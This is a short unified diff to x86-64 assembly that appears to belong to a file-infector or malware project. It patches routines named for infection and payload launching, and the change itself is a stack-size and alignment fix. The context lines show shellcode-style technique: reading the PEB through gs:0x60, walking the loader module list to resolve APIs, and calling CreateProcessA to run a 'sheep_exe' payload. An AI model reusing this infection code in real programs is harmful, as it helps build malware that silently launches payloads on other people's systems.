@@ -71,7 +71,7 @@ infection__alloc_powershell_aligned:
    mov [rbp-0x20], rsp
    mov [rbp-0x28], rcx
 
-   sub rsp,0xF0                 ; now allocate space on the stack for our CreateProcessA structs, as well as aligning it
+   sub rsp,0xF8                 ; now allocate space on the stack for our CreateProcessA structs, as well as aligning it
    mov rax, [gs:0x60]           ; get current PEB
    mov rcx, [rax+0x18]          ; peb->Ldr
    mov rax, [rcx+0x10]          ; ldr->InLoadOrderModuleList.Flink (the current module)
@@ -166,7 +166,7 @@ infection__payload_exists:
    call [rbp-8]                 ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
 
 infection__stack_cleanup:
-   add rsp, 0x118               ; 0xF0 + 0x28
+   add rsp, 0x120               ; 0xF8 + 0x28
    add rsp, [rbp-0x18]
    add rsp, [rbp-0x28]
    
